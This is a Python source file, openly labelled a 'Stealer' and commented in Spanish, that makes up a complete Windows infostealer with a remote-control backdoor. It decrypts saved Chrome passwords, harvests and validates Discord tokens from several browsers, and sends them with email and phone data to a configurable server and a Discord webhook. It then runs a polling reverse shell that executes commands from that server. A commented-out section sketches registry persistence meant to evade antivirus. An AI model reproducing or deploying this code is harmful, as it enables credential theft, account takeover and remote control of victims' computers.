# -*- coding: UTF-8 -*-
import re
import sqlite3
import urllib3
import winreg as reg
import os
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import subprocess
import time
import random
import string
from urllib.request import Request, urlopen
SERVER="localhost:80" #Ejemplos//Examples: 32.14.93.2 - api.example.com:8312
WEBHOOK = ""
def get_master_key():
    with open(os.environ['USERPROFILE']+r'\AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  # removing DPAPI
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"
def subprocess_args(include_stdout=True):
    if hasattr(subprocess, 'STARTUPINFO'):
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        env = os.environ
    else:
        si = None
        env = None
    if include_stdout:
        ret = {'stdout': subprocess.PIPE}
    else:
        ret = {}
    ret.update({'stdin': subprocess.PIPE,
                'stderr': subprocess.PIPE,
                'startupinfo': si,
                'env': env })
    return ret
def contraseñas():
    try:
        abdul = "LOGGUER:\n"
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
        shutil.copy2(login_db, "Loginvault.db")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                abdul = abdul+'URL:{} Usuario:{} Contraseña:{}\n'.format(url, username, decrypted_password)
                if len(username) > 0:
                    pass
        except Exception as e:
            pass
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except Exception as e:
            pass
        return abdul
    except:
        return "Chrome no esta instalado"
tok = ""
import base64
from requests import get, post
import json
from json import loads, dumps
PING_ME = False
token = ""
def revershell(usuario):
    http = urllib3.PoolManager()
    while True:
        time.sleep(2)
        try:
            a = ""
            print(usuario)
            json = base64.b64encode(dumps({"nombre": usuario}).encode('utf-8'))
            peticion = http.request('POST', "http://" + SERVER + "/api/cola", fields={'json': json})
            print(peticion.data.decode('utf-8'))
            peticion = loads(peticion.data)
            identificador = peticion["identificador"]
            time.sleep(2)
            if peticion['comando'].split()[0] == "dir":
                a = "[DIRS]"
                for xa in os.listdir():
                    a = a + "\n" + xa
            elif peticion['comando'].split()[0] == "cd":
                os.chdir(peticion['comando'].split()[1])
                a="[Sin output (se modifico el directorio base)]"
            else:
                a = subprocess.Popen(peticion['comando'], **subprocess_args(True))
                a = a.communicate()[0].decode('utf-8', errors='ignore')
            cwd = "\n"+os.getcwd()+">"
            a = a+cwd
            json = {"nombre": usuario, "identificador": identificador, "resultado": base64.b64encode(a.encode("utf-8")).decode("utf-8")}
            json = base64.b64encode(dumps(json).encode("utf-8")).decode("utf-8")
            print(json)
            r = http.request('POST', "http://" + SERVER + "/api/cargar", fields={'json': json})
            print(r.data)
            continue
        except Exception as down:
            print(str(down))
            continue
def encontrar_tokens(path): #Ejemplo copiado de github, revisar las db de chrome (y buscadores) y en discord xD. Esto puede dar falsos positivos.
    # Ya que es una expresion regular y es muy general. Por lo tanto se verifican todos los tokens hasta que se encuentre uno valido
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
def checktokens():
    try:
        for l in range(0, 3):
            local = os.getenv('LOCALAPPDATA')
            roaming = os.getenv('APPDATA')

            rutas = {
                'Discord': roaming + '\\Discord',
                'Discord Canary': roaming + '\\discordcanary',
                'Discord PTB': roaming + '\\discordptb',
                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
                'Opera': roaming + '\\Opera Software\\Opera Stable',
                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
            }
            for platform, path in rutas.items():
                if not os.path.exists(path):
                    continue

                tokens = encontrar_tokens(path)
                if len(tokens) > 0:
                    for token in tokens:
                        headers = {'Authorization': token,
                                    'Content-Type': 'application/json'}  # get a la api de discord por token para recibir verificacion de token y subir datos correctamente
                        src = get('https://canary.discord.com/api/v7/users/@me', headers=headers)
                        datosusuario = loads(src.content)
                        try:
                            datosusuario["username"]
                            return [datosusuario, token]
                        except:
                            pass
    except:
        pass
def main():
    """Stealer"""
    random2 = 'NOUSER'
    random2 += ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(4))
    jsons2 = {
        "token": "Hubo un error al encontrar el token",
        "nitro": "",
        "usuario": random2,
        "email": "Sin email",
        "telefono": "Sin telefono",
        "distinguidor": "0000",
        "passwd": "Chrome no esta instalado"  # Maximo 1400 bytes, las peticiones
    }
    datosusuario = checktokens()
    token = datosusuario[1]
    datosusuario = datosusuario[0]
    if not datosusuario:
        return False
    try:
        datosusuario['premium_type']
        if datosusuario['premium_type'] == 1:
            dnitro = "Nitro Classic"
        elif datosusuario['premium_type'] == 2:
            dnitro = "Nitro boost"
    except Exception:
        dnitro = "Sin nitro"
    contrasenas = contraseñas()
    if len(contrasenas) > 1400:
        contrasenas = contrasenas[0:1400]
    jsons2 = {
                "token": token,
                "nitro": dnitro,
                "usuario": datosusuario["username"] + "#" + datosusuario["discriminator"],
                "email": datosusuario["email"],
                "telefono": datosusuario["phone"],
                "distinguidor": os.environ['COMPUTERNAME'], #Tener un id de cada maquina individualmente.,
                "passwd": contrasenas #Maximo 1400 bytes, las peticiones
        }
    try:
        jsons = json.dumps(jsons2)
        jsons = base64.b64encode(jsons.encode('utf-8')).decode("utf-8")
        respuesta = get("http://"+SERVER+"/api/?b="+jsons)
        """Enviamos un get a la api con el json encodeado en b64"""
    except:
        main()
    respuesta = json.loads(respuesta.text)
    """Idea persistencia (trabajando en que el antivirus no lo detecte)
    archivo = os.path.splitext(os.path.basename(__file__))[0]+".exe"
    cl = reg.HKEY_CURRENT_USER
    clavevalor = "Software\Microsoft\Windows\CurrentVersion\RunOnce"
    shutil.copy(os.getcwd()+"\\"+archivo, os.getenv('APPDATA')+"\\"+archivo)
    open = reg.OpenKey(cl,clavevalor,0,reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open,"VerWin",0,reg.REG_SZ,os.getenv('APPDATA')+"\\"+archivo)
    reg.CloseKey(open)"""
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    asdp = jsons2['usuario'] + jsons2['distinguidor']
    message = f"**Token: {jsons2['token']}** \n**Usuario: {asdp}** **Contraseñas: {contrasenas}**"
    payload = json.dumps({'content': message})
    try:
        req = Request(WEBHOOK, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass
    revershell(jsons2['usuario'])

if __name__ == '__main__':
    main()